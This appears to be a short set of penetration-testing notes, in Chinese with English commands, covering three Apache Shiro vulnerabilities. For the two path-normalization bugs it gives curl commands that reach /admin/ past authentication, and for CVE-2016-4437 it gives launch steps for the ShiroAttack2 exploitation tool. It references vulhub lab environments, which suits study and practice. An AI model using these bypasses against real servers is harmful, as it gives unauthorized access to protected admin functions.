# Shiro

## CVE-2010-3863 <a href="#apacheshiro124-fan-xu-lie-hua-lou-dong-cve20164437" id="apacheshiro124-fan-xu-lie-hua-lou-dong-cve20164437"></a>

1.1.0 之前的 Apache Shiro 和 JSecurity 0.9.x 在将 URI 路径与 shiro.ini 文件中的条目进行比较之前不会对其进行规范化，这允许远程攻击者通过精心设计的请求绕过预期的访问限制，如 `/./` 、 `/../` 、 `/` 、 `//` URI。

```bash
HOST=; PORT=8080; # TARGET HOST INFO

curl http://$HOST:$PORT/admin/ -I
# HTTP/1.1 302

curl http://$HOST:$PORT/./admin/ -I
# HTTP/1.1 200
```

## CVE-2016-4437 <a href="#apacheshiro124-fan-xu-lie-hua-lou-dong-cve20164437" id="apacheshiro124-fan-xu-lie-hua-lou-dong-cve20164437"></a>

需要配置 JDK 1.8

```bash
cd ~/hack/tools/shiro/ShiroAttack2
java -jar shiro_attack-4.7.0-SNAPSHOT-all.jar
```

```bash
# REFERENCE DOCS
https://github.com/SummerSec/ShiroAttack2
https://vulhub.org/#/environments/shiro/CVE-2016-4437
```

## CVE-2020-1957

在带有 Spring 动态控制器的 Apache Shiro 1.5.2 之前的版本中，攻击者可以使用 `..;` 构造恶意制作的请求来绕过目录身份验证。

```bash
HOST=; PORT=8080; # TARGET HOST INFO

curl http://$HOST:$PORT/admin/ -I
# HTTP/1.1 302

curl http://$HOST:$PORT/xxx/..;/admin/ -I
# HTTP/1.1 200
```

```bash
# REFERENCE DOCS
https://github.com/vulhub/vulhub/blob/master/shiro/CVE-2020-1957/README.zh-cn.md
```
